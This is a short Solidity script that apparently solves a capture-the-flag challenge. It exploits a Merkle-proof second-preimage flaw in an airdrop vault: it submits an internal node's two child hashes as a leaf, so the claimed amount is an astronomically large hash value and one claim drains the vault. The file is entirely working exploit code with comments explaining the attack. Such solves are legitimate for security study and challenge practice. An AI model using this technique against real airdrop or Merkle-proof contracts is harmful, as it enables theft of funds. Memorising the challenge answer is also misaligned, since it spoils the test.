// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C2Branch.sol";

/// Second-preimage: present an internal node (childL, childR) as a "leaf".
/// keccak256(l0, l1) equals the real node P01, and the payout uint256(l1) is a
/// hash — astronomically large — so one claim drains the airdrop.
contract SolveC2 is Script {
    function run() external {
        AirdropVault vault = BranchSetup(vm.envAddress("SETUP")).vault();
        bytes32[4] memory l = vault.leaves();
        bytes32[] memory proof = new bytes32[](1);
        proof[0] = keccak256(abi.encodePacked(l[2], l[3]));   // sibling node P23
        vm.startBroadcast();
        vault.claim(l[0], l[1], proof);   // leaf = keccak(l0,l1) = node P01
        vm.stopBroadcast();
    }
}
